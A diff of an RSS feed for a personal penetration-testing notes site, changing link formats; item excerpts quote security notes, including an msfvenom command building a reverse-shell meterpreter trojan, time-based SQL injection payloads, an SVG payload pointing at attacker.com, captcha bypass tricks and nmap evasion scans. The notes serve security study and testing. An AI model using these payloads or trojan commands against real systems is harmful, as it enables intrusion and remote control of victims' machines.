@@ -10,28 +10,28 @@
     <lastBuildDate>Fri, 29 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://duraki.github.io/notes/public/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title></title>
-      <link>https://duraki.github.io/notes/public/.html</link>
+      <link>https://duraki.github.io/notes/public/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/.html</guid>
+      <guid>https://duraki.github.io/notes/public/</guid>
       <description></description>
     </item>
     
     <item>
       <title>~ ideas</title>
-      <link>https://duraki.github.io/notes/public/~-ideas.html</link>
+      <link>https://duraki.github.io/notes/public/~-ideas/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/~-ideas.html</guid>
+      <guid>https://duraki.github.io/notes/public/~-ideas/</guid>
       <description> SonicWall SMA100 Firmware 1day OPC Router DLL Hijacking, XML Attack via Licenses  </description>
     </item>
     
     <item>
       <title>Android Reverse Engineering</title>
-      <link>https://duraki.github.io/notes/public/android-reverse-engineering.html</link>
+      <link>https://duraki.github.io/notes/public/android-reverse-engineering/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/android-reverse-engineering.html</guid>
+      <guid>https://duraki.github.io/notes/public/android-reverse-engineering/</guid>
       <description>Burp Proxy Setup If using Android 7 or above, you need to export Burp CA Certificate from Proxy → Options, and selecting Import/Export CA certificate. Android wants the certificate to be in PEM format. The filename has to be equal to the subject_hash_old value appended with .0.
 Note - if you are using OpenSSL &amp;lt; 1.0, you need to use subject_hash instead of subject_hash_old.
 Using openssl is recommended way to convert DER to PEM format.</description>
@@ -39,37 +39,37 @@ Using openssl is recommended way to convert DER to PEM format.</description>
     
     <item>
       <title>API Penetration Test Checklist</title>
-      <link>https://duraki.github.io/notes/public/api-penetration-test-checklist.html</link>
+      <link>https://duraki.github.io/notes/public/api-penetration-test-checklist/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/api-penetration-test-checklist.html</guid>
+      <guid>https://duraki.github.io/notes/public/api-penetration-test-checklist/</guid>
       <description>--- ## Authentication - [ ] Don&amp;#39;t use `Basic Auth`. Use standard authentication instead (e.g. [JWT](https://jwt.io/), [OAuth](https://oauth.net/)). - [ ] Don&amp;#39;t reinvent the wheel in `Authentication`, `token generation`, `password storage`. Use the standards. - [ ] Use `Max Retry` and jail features in Login. - [ ] Use encryption on all sensitive data. ### JWT (JSON Web Token) - [ ] Use a random complicated key (`JWT Secret`) to make brute forcing the token very hard.</description>
     </item>
     
     <item>
       <title>Automotive Cybersecurity Videos</title>
-      <link>https://duraki.github.io/notes/public/automotive-cybersecurity-videos.html</link>
+      <link>https://duraki.github.io/notes/public/automotive-cybersecurity-videos/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/automotive-cybersecurity-videos.html</guid>
+      <guid>https://duraki.github.io/notes/public/automotive-cybersecurity-videos/</guid>
       <description>https://www.youtube.com/watch?v=xHfInsMEYdQ https://www.youtube.com/watch?v=DUNWZnhneiI https://www.youtube.com/watch?v=mz55tsLnlSc https://www.youtube.com/watch?v=k50hU6aPlG8 https://www.youtube.com/watch?v=k4JD2ZUHrXA - Cert-based auth via UDS https://www.youtube.com/watch?v=KqV5nIkGKFs - CANFD explained https://www.youtube.com/watch?v=XMVLkbw1BNE - New Standard for Ethernet on a Bus Line (10BASE-T1S) https://www.youtube.com/watch?v=WW481idfcro - Cert-based auth via Vector tool https://www.youtube.com/watch?v=pxlx3_gEiFM - Embedded Security in Automotive https://www.youtube.com/watch?v=3uU0Sl-byVc - Using ML to detect anomalyes https://www.youtube.com/watch?v=QEOWjEytb6Y - Cert-based in diagnostics (in-depth) https://www.youtube.com/watch?v=bUdxpsQXeRU - Corporate security testing in Automotive https://www.youtube.com/watch?v=DuXhz4mDYZA - From TARA to Pentest https://www.youtube.com/watch?v=7D7uNqPWrXw - Using Scapy for Car pentesting</description>
     </item>
     
     <item>
       <title>Automotive Hacking</title>
-      <link>https://duraki.github.io/notes/public/automotive-hacking.html</link>
+      <link>https://duraki.github.io/notes/public/automotive-hacking/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/automotive-hacking.html</guid>
+      <guid>https://duraki.github.io/notes/public/automotive-hacking/</guid>
       <description>Link ECUs to avoid wires (weight, size, cost) Network Protocols allow ECUs to share information quickly and precisely (Ethernet &amp;amp; CANFD/CAN) Networks used between ECUs are based on Serial Communications  Serial means that items of information are sent via a single stream of communication   Speed of communication is measured in number of bits sent per second (bps) CAN (Controller Area Network) bus was developed to meet needs of up to 1 million bits per second (1Mbps) LIN (Local Interconnect Network) introduced to give a lower cost, lower speed altenative (~20 kbps) FlexRay was developed for more fault-tolerant, higher speed (10Mbps) network Ethernet (100Mbps) for videos and advanced driver assistance systems (new vehicles)  Special ECU are used called &amp;ldquo;gateways&amp;rdquo; to interconnect different network protocols (CAN + LIN, or Ethernet + FlexRay etc.</description>
     </item>
     
     <item>
       <title>Byteman</title>
-      <link>https://duraki.github.io/notes/public/byteman.html</link>
+      <link>https://duraki.github.io/notes/public/byteman/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/byteman.html</guid>
+      <guid>https://duraki.github.io/notes/public/byteman/</guid>
       <description>Introduction Byteman is a bytecode manipulation tool for tweaking and changing Java application at load time and runtime. It work without the needs for recompilation. The modification is purely in memory, via Event Condition Action rule language - based on Java.
 Rules Write ECA based rules which you can inject using Byteman directives and command line application.
 # =&amp;gt; trace.btm RULE trace main entry CLASS ^CognitiveApp METHOD main AT ENTRY IF TRUE DO traceln(&amp;#34;Byteman: Application loaded successfully.</description>
@@ -77,10 +77,10 @@ Rules Write ECA based rules which you can inject using Byteman directives and co
     
     <item>
       <title>Byteman Scripts</title>
-      <link>https://duraki.github.io/notes/public/byteman-scripts.html</link>
+      <link>https://duraki.github.io/notes/public/byteman-scripts/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/byteman-scripts.html</guid>
+      <guid>https://duraki.github.io/notes/public/byteman-scripts/</guid>
       <description>Simple trace skeleton
 RULE trace CLASS ^App METHOD login AT ENTRY IF true DO System.out.println(&amp;#34; Tracing login stdout&amp;#34;) DO traceln(&amp;#34;Tracing login ended&amp;#34;) ENDRULE Trace application entry
 RULE trace application entry CLASS ^App METHOD main AT ENTRY IF TRUE DO traceln(&amp;#34;BMB java.application.main() called!&amp;#34;) ENDRULE Trace application exit
@@ -90,39 +90,39 @@ RULE trace thread start CLASS java.</description>
     
     <item>
       <title>CANFD Specifications</title>
-      <link>https://duraki.github.io/notes/public/canfd-specifications.html</link>
+      <link>https://duraki.github.io/notes/public/canfd-specifications/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/canfd-specifications.html</guid>
+      <guid>https://duraki.github.io/notes/public/canfd-specifications/</guid>
       <description> Extended CAN frame. Can send larger payloads. A bit different structure. Using CANEdge2 for testing the CANFD frames.  </description>
     </item>
     
     <item>
       <title>Captcha Bypass Tricks</title>
-      <link>https://duraki.github.io/notes/public/captcha-bypass-tricks.html</link>
+      <link>https://duraki.github.io/notes/public/captcha-bypass-tricks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/captcha-bypass-tricks.html</guid>
+      <guid>https://duraki.github.io/notes/public/captcha-bypass-tricks/</guid>
       <description>Header Injection to bypoass Captcha
 1. Response manipulation. 2. Use previously used token. 3. Use any token with same length(+1/-1). 4. Remove the param value or remove the entire parameter. 5. Change method from POST to GET(or PUT) and remove the captcha. 6. Change body to JSON or vice-versa. 7. OCR. 8. Check whether the captcha is in the source code. (Ex: 2+2) 9. Check whether the value of the captcha is in the source code.</description>
     </item>
     
     <item>
       <title>Classical API Abuse</title>
-      <link>https://duraki.github.io/notes/public/classical-api-abuse.html</link>
+      <link>https://duraki.github.io/notes/public/classical-api-abuse/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/classical-api-abuse.html</guid>
+      <guid>https://duraki.github.io/notes/public/classical-api-abuse/</guid>
       <description>API Keys Reuse Use Keyhacks to scan for key leaks.
 API Calling Convention Try to hook() on a call or initiate new calls from the handler.</description>
     </item>
     
     <item>
       <title>Cycript</title>
-      <link>https://duraki.github.io/notes/public/cycript.html</link>
+      <link>https://duraki.github.io/notes/public/cycript/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/cycript.html</guid>
+      <guid>https://duraki.github.io/notes/public/cycript/</guid>
       <description>Tips and Tricks
 Get pasteboard/clipboard items.
 [UIPasteboard generalPasteboard].items Get UI elements dump.
@@ -134,57 +134,57 @@ Syslog Macros
     
     <item>
       <title>Decrypt IPA from AppStore</title>
-      <link>https://duraki.github.io/notes/public/decrypt-ipa-from-appstore.html</link>
+      <link>https://duraki.github.io/notes/public/decrypt-ipa-from-appstore/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/decrypt-ipa-from-appstore.html</guid>
+      <guid>https://duraki.github.io/notes/public/decrypt-ipa-from-appstore/</guid>
       <description>Requires iproxy and frida-ios-dump. File will be generated in current directory with *.ipa extension.
 # =&amp;gt; Start iproxy $ iproxy 2222 22 # =&amp;gt; Lists App from iOS processes $ cd ~/util/re/ios/frida-ios-dump $ python dump.py -l PID Name Identifier --- - App Name Here xxx.xxxxxx.xxxxxx.xx # =&amp;gt; Dump App from iOS device $ ./dump.py xxx.xxxxxx.xxxxxx.xx ... </description>
     </item>
     
     <item>
       <title>ECU Calibration</title>
-      <link>https://duraki.github.io/notes/public/ecu-calibration.html</link>
+      <link>https://duraki.github.io/notes/public/ecu-calibration/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/ecu-calibration.html</guid>
+      <guid>https://duraki.github.io/notes/public/ecu-calibration/</guid>
       <description>ECU tuning is a part of Calibration Changing some values to make a vehicle faster, have better accelaration etc. This calibration process is used to fine tune all parameters before final manufacturing process Usually XCP interface is removed from final production If XCP is open, you still need to reverse the firmware to understand the ECU  How to Calibrate and Adjust  Calibration Software Vehicle networks Interface to the ECU Calibration Protocol ECU description file (*.</description>
     </item>
     
     <item>
       <title>ECU Foundations</title>
-      <link>https://duraki.github.io/notes/public/ecu-foundations.html</link>
+      <link>https://duraki.github.io/notes/public/ecu-foundations/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/ecu-foundations.html</guid>
+      <guid>https://duraki.github.io/notes/public/ecu-foundations/</guid>
       <description>ECU  Electronic Control Unit the &amp;ldquo;ECU&amp;rdquo; Doing calculations or apply rules in the vehicle system  Calculation example of ECU Meassure &amp;ldquo;Speed (km/h)&amp;rdquo; ECU would &amp;ldquo;calculate&amp;rdquo;: - speed (km/h) = wheel (rpm) x 3.6   Apply a tiny part of logic  If speed is above 5km/h, then lock the doors   ECUs are wired to sensors, mothers, and other actuators One ECU can be used for different vehicles They use microcontroller (have memory/storage unlike microprocessor) Uses embedded software, via special hardware that converts electrical signal to numbers (and vice-versa), collectively IO (input/output) Uses networking hardware, via in-vehicle networks (like CANBus)  ECU Software Layers</description>
     </item>
     
     <item>
       <title>Ethernet Specifications</title>
-      <link>https://duraki.github.io/notes/public/ethernet-specifications.html</link>
+      <link>https://duraki.github.io/notes/public/ethernet-specifications/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/ethernet-specifications.html</guid>
+      <guid>https://duraki.github.io/notes/public/ethernet-specifications/</guid>
       <description>Specifications  SomeIP, Ethernet, IP Stack New standard 10BASE-T1S 10Mbit/s Half-duplex PLCA bus cycle - only specific PHY that can send data Physical Layer Collision Avoidance (PLCA) Avoid collision of data Multiple applications on single cable  </description>
     </item>
     
     <item>
       <title>Firewall Engagements</title>
-      <link>https://duraki.github.io/notes/public/firewall-engagements.html</link>
+      <link>https://duraki.github.io/notes/public/firewall-engagements/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/firewall-engagements.html</guid>
+      <guid>https://duraki.github.io/notes/public/firewall-engagements/</guid>
       <description>Reconned from the start to finish in a few sec &amp;hellip;
 ┌──(kali㉿kali)-[~] └─$ ping x.x.x.x PING ??? 56(84) bytes of data. 64 bytes from ???: icmp_seq=1 ttl=52 time=64.4 ms 64 bytes from ???: icmp_seq=2 ttl=52 time=62.7 ms ^C --- ??? ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms ┌──(kali㉿kali)-[~] └─$ host x.x.x.x % nslookup &amp;gt; set type=PTR &amp;gt; x.x.x.x Server:	???	Address: ???	Non-authoritative answer: .</description>
     </item>
     
     <item>
       <title>Frida &amp; Objection Tutorial</title>
-      <link>https://duraki.github.io/notes/public/frida-objection-tutorial.html</link>
+      <link>https://duraki.github.io/notes/public/frida-objection-tutorial/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/frida-objection-tutorial.html</guid>
+      <guid>https://duraki.github.io/notes/public/frida-objection-tutorial/</guid>
       <description>Android Tutorial Frida Setup Make sure to have Android Debugging interface running (adbd) on your testing device. For reference, read the adbd setup first and then continue here.
 Install the Frida for Android:
 $ adb root # might be required $ adb push frida-server /data/local/tmp/ $ adb shell &amp;#34;chmod 755 /data/local/tmp/frida-server&amp;#34; $ adb shell &amp;#34;/data/local/tmp/frida-server &amp;amp;&amp;#34; Smoke test on Frida setup:
@@ -193,20 +193,20 @@ $ adb devices -l $ frida-ps -U # PID NAME 1590 com.</description>
     
     <item>
       <title>How to compromise ECU</title>
-      <link>https://duraki.github.io/notes/public/how-to-compromise-ecu.html</link>
+      <link>https://duraki.github.io/notes/public/how-to-compromise-ecu/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/how-to-compromise-ecu.html</guid>
+      <guid>https://duraki.github.io/notes/public/how-to-compromise-ecu/</guid>
       <description>Five steps to compromise ECU:
  Remote access Access to in-vehicle network Bridge domain boundaries Access to target ECU Manipulate ECU or vehicle behavior  Find more info about Car Hacking on notes.</description>
     </item>
     
     <item>
       <title>How to write Notes</title>
-      <link>https://duraki.github.io/notes/public/how-to-write-notes.html</link>
+      <link>https://duraki.github.io/notes/public/how-to-write-notes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/how-to-write-notes.html</guid>
+      <guid>https://duraki.github.io/notes/public/how-to-write-notes/</guid>
       <description>TL;DR  Use Markdown for everything. Site generator reuses it as well. Use shortcodes Clear and consistent  Shortcodes Caption images via this shortcode
 &amp;lt;span class=&amp;#34;caption-wrapper&amp;#34;&amp;gt; &amp;lt;img class=&amp;#34;caption&amp;#34; src=&amp;#34;/images/2016/thetheme/1.png&amp;#34; title=&amp;#34;Sample caption&amp;#34; alt=&amp;#34;Sample caption&amp;#34;&amp;gt; &amp;lt;span class=&amp;#34;caption-text&amp;#34;&amp;gt;Sample caption&amp;lt;/span&amp;gt; &amp;lt;/span&amp;gt; {{ &amp;lt; imgcap title=&amp;#34;Sample caption&amp;#34; src=&amp;#34;/images/2016/thetheme/1.png&amp;#34; &amp;gt; }} Insert Gist via this line
 {{ &amp;lt; gist duraki 78985452 &amp;#34;filename.go&amp;#34; &amp;gt; }} Include Instagram image in the note
@@ -215,10 +215,10 @@ $ adb devices -l $ frida-ps -U # PID NAME 1590 com.</description>
     
     <item>
       <title>iOS Reverse Engineering</title>
-      <link>https://duraki.github.io/notes/public/ios-reverse-engineering.html</link>
+      <link>https://duraki.github.io/notes/public/ios-reverse-engineering/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/ios-reverse-engineering.html</guid>
+      <guid>https://duraki.github.io/notes/public/ios-reverse-engineering/</guid>
       <description>References
  iOS CheatSheet Decrypting apps from AppStore Reverse Engineering Tools iOS Static Analysis  Using class-dump
 $ class-dump -S -s -H App -o /path/to/headers/App/  Frida &amp;amp; Objection Tutorial Pure Reverse Engineering Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis  </description>
@@ -226,29 +226,29 @@ $ class-dump -S -s -H App -o /path/to/headers/App/  Frida &amp;amp; Objection Tu
     
     <item>
       <title>iOS Static Analysis</title>
-      <link>https://duraki.github.io/notes/public/ios-static-analysis.html</link>
+      <link>https://duraki.github.io/notes/public/ios-static-analysis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/ios-static-analysis.html</guid>
+      <guid>https://duraki.github.io/notes/public/ios-static-analysis/</guid>
       <description> Find all JSON and Plist files in app bundle and see if there are any disclosures NSAllowsArbitraryLoads - Disables App Transport Security (ATS), allowing weak TLS configs CFBundleURLTypes - Custom Scheme URLs that can be exploited further (see this) AFNetworking 2.5.1 - Version and below are vulnerable to MITM if there was no SSL pinning applied  </description>
     </item>
     
     <item>
       <title>Jailbreak Bypass</title>
-      <link>https://duraki.github.io/notes/public/jailbreak-bypass.html</link>
+      <link>https://duraki.github.io/notes/public/jailbreak-bypass/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/jailbreak-bypass.html</guid>
+      <guid>https://duraki.github.io/notes/public/jailbreak-bypass/</guid>
       <description>If jailbreak detection persists in iOS application, try these tricks:
  Libery Lite via Cydia, then go to settings, and then select the application Recommended Objection use ios jailbreak disable or --startup-command Frida as a standalone instrumentation Manual Patching, the old school way  </description>
     </item>
     
     <item>
       <title>Linux Notes</title>
-      <link>https://duraki.github.io/notes/public/linux-notes.html</link>
+      <link>https://duraki.github.io/notes/public/linux-notes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/linux-notes.html</guid>
+      <guid>https://duraki.github.io/notes/public/linux-notes/</guid>
       <description>Active Directory
 Access Active Directory Domain Admin via Linux:
 $ sudo apt-get realmd $ realm join example.ba --user username </description>
@@ -256,20 +256,20 @@ $ sudo apt-get realmd $ realm join example.ba --user username </description>
     
     <item>
       <title>List of Topics</title>
-      <link>https://duraki.github.io/notes/public/list-of-topics.html</link>
+      <link>https://duraki.github.io/notes/public/list-of-topics/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/list-of-topics.html</guid>
+      <guid>https://duraki.github.io/notes/public/list-of-topics/</guid>
       <description>Personal list of topics of interest. At least for me eh? :)
 Automotive Cyber Security  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Compromise Vehicle Graybox Security Testing 👏  Classical Penetration Testing  Web Pentest Oneliners Web Fuzzing SQL Injection Payloads XSS Payloads Captcha Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library   Networking  Basic Network Recon Firewall Penetration Test GSN3 Lab Environment Metasploit Framework    Reverse Engineering  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts iOS Reverse Engineering  Frida &amp;amp; Objection Tutorial Pure Reverse Engineering Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida &amp;amp; Objection Tutorial   OPCRouter Research  Development  todo: vim.</description>
     </item>
     
     <item>
       <title>MacOS Notes</title>
-      <link>https://duraki.github.io/notes/public/macos-notes.html</link>
+      <link>https://duraki.github.io/notes/public/macos-notes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/macos-notes.html</guid>
+      <guid>https://duraki.github.io/notes/public/macos-notes/</guid>
       <description>Check Application entitlement
 # ~&amp;gt; brew install jtool # =&amp;gt; no visible entitlemens $ jtool --ent /Applications/MachOView.app /Applications/MachOView.app/Contents/MacOS//MachOView apparently does not contain any entitlements # =&amp;gt; with visible entitlements $ jtool --ent /Applications/ProtonVPN.app &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE plist PUBLIC &amp;#34;-//Apple//DTD PLIST 1.0//EN&amp;#34; &amp;#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;#34;&amp;gt; &amp;lt;plist version=&amp;#34;1.0&amp;#34;&amp;gt; &amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;com.apple.application-identifier&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;J6S6Q257EK.ch.protonvpn.mac&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;com.apple.developer.maps&amp;lt;/key&amp;gt; &amp;lt;true/&amp;gt; ... libSystem.B.dylib
 All API rely on above library. For example, when the MachO Process starts, the above library will be loaded early in time so it can use other APIs.</description>
@@ -277,10 +277,10 @@ All API rely on above library. For example, when the MachO Process starts, the a
     
     <item>
       <title>Metasploit Framework</title>
-      <link>https://duraki.github.io/notes/public/metasploit-framework.html</link>
+      <link>https://duraki.github.io/notes/public/metasploit-framework/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/metasploit-framework.html</guid>
+      <guid>https://duraki.github.io/notes/public/metasploit-framework/</guid>
       <description>Create executable trojan
 $ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=192.168.153.128 LPORT=8888 -o /root/Desktop/dolphin.exe On Attackers machine (Starting Session)
 $ msfconsole ... [loaded] msf5 exploit(multi/handler) &amp;gt; use multi/handler msf5 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcp payload =&amp;gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &amp;gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &amp;#39;&amp;#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) &amp;gt; set LHOST 192.</description>
@@ -288,20 +288,20 @@ $ msfconsole ... [loaded] msf5 exploit(multi/handler) &amp;gt; use multi/handler
     
     <item>
       <title>Network Lab</title>
-      <link>https://duraki.github.io/notes/public/network-lab.html</link>
+      <link>https://duraki.github.io/notes/public/network-lab/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/network-lab.html</guid>
+      <guid>https://duraki.github.io/notes/public/network-lab/</guid>
       <description>Simple Topology In GSN3, add 2 VPCS and 2 Cisco routers. Start VPCS and enter Console mode. Append IPv4 address for the interface.
 # sets ipv4; netmask and gw for the vpc PC1&amp;gt; ip 192.168.0.10/24 192.168.0.1 Checking for duplicate address... PC1 : 192.168.0.10 255.255.255.0 gateway 192.168.0.1 # ... same for the 2nd vpc with different static ip # PC2&amp;gt; ip 192.168.0.11/24 192.168.0.1 Always save the configuration of the assets with save command:</description>
     </item>
     
     <item>
       <title>Network Recon</title>
-      <link>https://duraki.github.io/notes/public/network-recon.html</link>
+      <link>https://duraki.github.io/notes/public/network-recon/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/network-recon.html</guid>
+      <guid>https://duraki.github.io/notes/public/network-recon/</guid>
       <description>External Network Engagement nmap oneliners (do-it-all) + fw evasion
 $ nmap -Pn -vvv -sC --script=firewalk -p1-65535 -D RND:10 &amp;lt;target&amp;gt; basic recon
 $ nslookup set type=NS x.x.x.x basic nmap
@@ -311,20 +311,20 @@ $ sudo masscan 80.</description>
     
     <item>
       <title>OPCRouter Research</title>
-      <link>https://duraki.github.io/notes/public/opcrouter-research.html</link>
+      <link>https://duraki.github.io/notes/public/opcrouter-research/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/opcrouter-research.html</guid>
+      <guid>https://duraki.github.io/notes/public/opcrouter-research/</guid>
       <description>OPC-Router.com Exploitation and Vulnearbility Research Supported Platforms:
  OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126.exe**)  Windows Server 2016 &amp;amp; 2012 R2 Windows 10 (also IoT) &amp;amp; 8.1   OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126 (Windows 7).exe**)  Windows Server 2012 R1 &amp;amp; 2008 R2 Windows 8.0 &amp;amp; 7    What is OPC OLE for Process Control (OPC) is a set of standard interfaces based upon Microsoft&amp;rsquo;s OLE/COM technology. The application of the OPC standard interface makes possible interoperability between automation/control applications, field systems/devices etc.</description>
     </item>
     
     <item>
       <title>Pure Reverse Engineering</title>
-      <link>https://duraki.github.io/notes/public/pure-reverse-engineering.html</link>
+      <link>https://duraki.github.io/notes/public/pure-reverse-engineering/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/pure-reverse-engineering.html</guid>
+      <guid>https://duraki.github.io/notes/public/pure-reverse-engineering/</guid>
       <description>Some internal knowledge have been shared here. Otherwise, check references below.
 Use Byteman to instrument compiled Java application and Jar based files. A sample script has been included in the notes.
 References
@@ -333,19 +333,19 @@ References
     
     <item>
       <title>Reverse Engineering Tricks and Tips</title>
-      <link>https://duraki.github.io/notes/public/reverse-engineering-tricks-and-tips.html</link>
+      <link>https://duraki.github.io/notes/public/reverse-engineering-tricks-and-tips/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/reverse-engineering-tricks-and-tips.html</guid>
+      <guid>https://duraki.github.io/notes/public/reverse-engineering-tricks-and-tips/</guid>
       <description>Find threads by patching a jump with a short jump (EB FE) to create an endless loop you can then search for Looking for &amp;ldquo;CO A8&amp;rdquo; to find local IP addr prefix (192.168) Looking for 4-byte Unix timestamps in hex in a file format or a network packet Search/google all application constant values, classes and libraries Resize Hex Editor window to identify unknown structures and its sizes Check application Log messages and Xref them Replace all https calls with http (instead of hooking on each TLS thread and decrypting SSL) Using LD_PRELOAD to disable specific functions or patching binaries on the fly Use Burp + mitm_relay to proxy traffic Decompile JAR and attack via Frida, Byteman or any other dynamic instrumentation toolkit Use dotPeek to identify and process attack surface for anything .</description>
     </item>
     
     <item>
       <title>SQLi Payloads</title>
-      <link>https://duraki.github.io/notes/public/sqli-payloads.html</link>
+      <link>https://duraki.github.io/notes/public/sqli-payloads/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/sqli-payloads.html</guid>
+      <guid>https://duraki.github.io/notes/public/sqli-payloads/</guid>
       <description>More examples might be avilable on netspi
 Classical Sleep:
 0&amp;#39;XOR(if(now()=sysdate(),sleep(15),0))XOR&amp;#39;Z =&amp;gt; 20.002 0&amp;#39;XOR(if(now()=sysdate(),sleep(6),0))XOR&amp;#39;Z =&amp;gt; 7.282 0&amp;#39;XOR(if(now()=sysdate(),sleep(0),0))XOR&amp;#39;Z =&amp;gt; 0.912 0&amp;#39;XOR(if(now()=sysdate(),sleep(15),0))XOR&amp;#39;Z =&amp;gt; 16.553 0&amp;#39;XOR(if(now()=sysdate(),sleep(3),0))XOR&amp;#39;Z =&amp;gt; 3.463 0&amp;#39;XOR(if(now()=sysdate(),sleep(0),0))XOR&amp;#39;Z =&amp;gt; 1.229 0&amp;#39;XOR(if(now()=sysdate(),sleep(6),0))XOR&amp;#39;Z =&amp;gt; 7.79 /api/tweets?city_id=(select(0)from(select(sleep(25)))v) ’) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END))--+ type=sharesCountTw&amp;amp;url=http%3a%2f%2finsideok.ru%2flica&amp;amp;count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A)) SQL in useragent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&amp;#39;;WAITFOR DELAY ‘00:00:05’;-- Blind SQL Injection:
@@ -354,19 +354,19 @@ Classical Sleep:
     
     <item>
       <title>SVG Payloads</title>
-      <link>https://duraki.github.io/notes/public/svg-payloads.html</link>
+      <link>https://duraki.github.io/notes/public/svg-payloads/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/svg-payloads.html</guid>
+      <guid>https://duraki.github.io/notes/public/svg-payloads/</guid>
       <description>&amp;lt;rect fill=�url(//attacker.com/malicious.svg#exploit)�&amp;gt; (@see: https://hackerone.com/reports/347139) </description>
     </item>
     
     <item>
